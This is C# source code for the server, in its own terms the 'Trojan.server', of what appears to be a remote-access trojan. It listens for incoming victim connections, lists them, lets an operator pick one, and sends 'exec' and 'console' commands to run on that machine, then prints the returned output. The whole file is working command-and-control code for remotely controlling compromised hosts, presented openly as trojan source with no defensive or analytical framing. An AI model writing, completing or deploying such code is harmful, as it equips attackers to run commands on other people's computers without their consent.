using System;
using System.Text;
using System.Net.Sockets;
using Trojan.exceptions;
using SocketData;

namespace Trojan.server
{
    public class Server : SocketHandler
    {
        public socketSetup Listener;
        public Socket? connectedToClient;

        protected string? CMD = null;

        public async Task Send_Socket()
        {
            if (Listener.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(Listener.sock));

            bool failedCMD;
            bool sendCMD;
            while (ServerStatus == ServerStatus.RUNNING)
            {
                failedCMD = false;
                sendCMD = false;
                try
                {                   
                    Console.Write("\r\nEnter command:\t");
                    CMD = Console.ReadLine();

                    if (CMD != null)
                    {
                        try
                        {
                            if (TruncationCheckCommand(CMD, 0, 5) == "local")
                            {
                                string[] arguments = CMD.Substring(6).Split(" ");

                                if (TruncationCheckCommand(CMD, 6, 4) == "list")
                                {
                                    int IncrementalCounter = 0;
                                    int RangeCounter = -1;

                                    if (2 < arguments.Length)
                                    {
                                        string ConnListCount = arguments[2];

                                        // TryParse returns 0 if parsing fails
                                        // Use this to decide if second parameter is set or not
                                        int.TryParse(ConnListCount, out RangeCounter);
                                    }

                                    string? text_underline;
                                    foreach (ConnectionSetup connection in ConnectionManager.connections)
                                    {
                                        if (RangeCounter != 0)
                                        {
                                            IncrementalCounter++;
                                        }
                                        else { break; }

                                        text_underline = connection.getRemoteEndPoint().ToString();
                                        if (text_underline != null)
                                            text_underline = new string('*', text_underline.Length);

                                        Console.WriteLine("\n\t\t" + connection.getRemoteEndPoint() + " [" + IncrementalCounter + "]");
                                        Console.WriteLine("\t\t" + text_underline);

                                        if (IncrementalCounter == RangeCounter) break;
                                    }
                                }
                                else if (TruncationCheckCommand(CMD, 6, 3) == "cls" || TruncationCheckCommand(CMD, 6, 5) == "clear")
                                {
                                    Console.Clear();
                                }
                                else if (TruncationCheckCommand(CMD, 6, 4) == "exit")
                                {
                                    Environment.Exit(0);
                                }
                                else if (TruncationCheckCommand(CMD, 6, 4) == "help")
                                {
                                    // Display help menu
                                }
                                else if (TruncationCheckCommand(CMD, 6, 7) == "pkgsize")
                                {
                                    if (2 > arguments.Length) continue;

                                    int new_pkgsize;
                                    int.TryParse(arguments[1], out new_pkgsize);

                                    if (new_pkgsize > 1024)
                                    {
                                        Console.WriteLine("\n[|] package size can not be over 1024 bytes");
                                    }

                                    if (new_pkgsize < 8)
                                    {
                                        Console.WriteLine("\n[|] package size can not be 8 or less bytes");
                                    }

                                    Listener.sock.ReceiveBufferSize = new_pkgsize;
                                }
                            }
                            else if (TruncationCheckCommand(CMD, 0, 4) == "conn" || TruncationCheckCommand(CMD, 0, 7) == "connect")
                            {
                                string[] arguments = CMD.Split(" ");

                                int connectSelection;
                                int.TryParse(arguments[1], out connectSelection);

                                int ConnectIndex = connectSelection - 1;
                                if (ConnectIndex >= ConnectionManager.connections.Count() || ConnectIndex <= -1)
                                {
                                    Console.WriteLine("\n[|] connection [{0}] doesnt exist", ConnectIndex + 1);
                                    continue;
                                }

                                if (connectedToClient != ConnectionManager.connections[ConnectIndex].getConn())
                                {
                                    connectedToClient = ConnectionManager.connections[ConnectIndex].getConn();
                                    Console.WriteLine("\n[+] Connected to :: {0} ;", connectedToClient.RemoteEndPoint);
                                }
                                else
                                {
                                    Console.WriteLine("\n[|] You are already connected to connection[" + (ConnectIndex + 1) + "]");
                                }
                            }
                            else if (TruncationCheckCommand(CMD, 0, 4) == "exec")
                            {
                                if(connectedToClient == null)
                                {
                                    Console.WriteLine("\n[|] you need to connect to a clint before executing client-side commands");
                                }

                                string[] arguments = CMD.Substring(5).Split(" ");
                                if (TruncationCheckCommand(CMD, 5, 7) == "pkgsize")
                                {
                                    if (2 > arguments.Length) continue;

                                    int new_pkgsize;
                                    int.TryParse(arguments[1], out new_pkgsize);

                                    if (new_pkgsize > 1024)
                                    {
                                        Console.WriteLine("\n[|] package size can not be over 1024 bytes");
                                    }

                                    if (new_pkgsize < 8)
                                    {
                                        Console.WriteLine("\n[|] package size can not be 8 or less bytes");
                                    }
                                }

                                sendCMD = true;
                            }
                            else if (TruncationCheckCommand(CMD, 0, 7) == "console")
                            {
                                if (connectedToClient == null)
                                {
                                    Console.WriteLine("\n[|] you need to connect to a clint before executing client-side commands");
                                }

                                // this code is redundant until further implementations of console

                                sendCMD = true;
                            }
                            else if (TruncationCheckCommand(CMD, 0, 2) == "do")
                            {
                            }
                        }
                        catch (Exception error) { Console.WriteLine(error); failedCMD = true; }

                        if (connectedToClient != null && !failedCMD && sendCMD)
                        {
                            await connectedToClient.SendAsync(Encoding.UTF8.GetBytes(CMD), SocketFlags.None);
                            SenderStatus = ServerStatus.WAITRESPONSE;
                            Console.ReadKey();
                        }
                    }
                }
                catch (Exception error)
                {
                    Console.WriteLine("\n\n[-] Send_Socket failed to send :: {0} :: {1} ;\n\n", nameof(error), error.ToString());
                }
            }
        }

        public async Task Receive_Socket()
        {
            ConnectionSetup CurrentConnection;
            bool endofmsg;
            while (ServerStatus == ServerStatus.RUNNING)
            {
                await Task.Delay(EVENT_CHECK_INTERVAL);

                if (SenderStatus == ServerStatus.WAITRESPONSE)
                {
                    endofmsg = false;
                    for (int i = 0; i < ConnectionManager.connections.Count(); i++)
                    {
                        CurrentConnection = ConnectionManager.connections[i];

                        if (CurrentConnection.getConn().Available > 0)
                        {
                            Array.Clear(CurrentConnection.getBuffer(), 0, CurrentConnection.getBuffer().Length);
                            await CurrentConnection.getConn().ReceiveAsync(CurrentConnection.getBuffer(), SocketFlags.None);

                            string message = Encoding.UTF8.GetString(CurrentConnection.getBuffer()).Replace("\0", "");

                            // Check for "end of data message"
                            if (message.EndsWith("<EODM>"))
                            {
                                endofmsg = true;
                                ReceiverStatus = ServerStatus.IDLE;
                            }
                            else { ReceiverStatus = ServerStatus.WAITRESPONSE; }

                            if (endofmsg)
                                message = message.Replace("<EODM>", "");

                            ConnectionManager.DataQueue.Enqueue(message);
                        }
                    }

                    if (ConnectionManager.DataQueue.Count() > 0 && ReceiverStatus != ServerStatus.WAITRESPONSE)
                    {
                        ConnectionManager.OutputDataQueue(endchar : false);
                        SenderStatus = ServerStatus.IDLE;
                    }
                }
            }
        }

        public void Init_Server()
        {
            if (HOST != null)
            {
                Listener = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), PORT, BUFFSIZE));
            }

            if (Listener.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(Listener.sock));

            _SocketOperations.Bind_Socket(Listener);
            _SocketOperations.Listen_Socket(ref Listener.sock, MAX_CONNECTIONS);

            Console.WriteLine("[+] Started listening on port :: {0} ;", Listener.port);

            ServerStatus = ServerStatus.RUNNING;

            Task.Factory.StartNew(() => _SocketOperations.Accept_Socket(Listener, SenderStatus));
            Task.Factory.StartNew(() => Receive_Socket());

            Console.ReadKey();
            Task.Factory.StartNew(() => Send_Socket());
        }
    }
}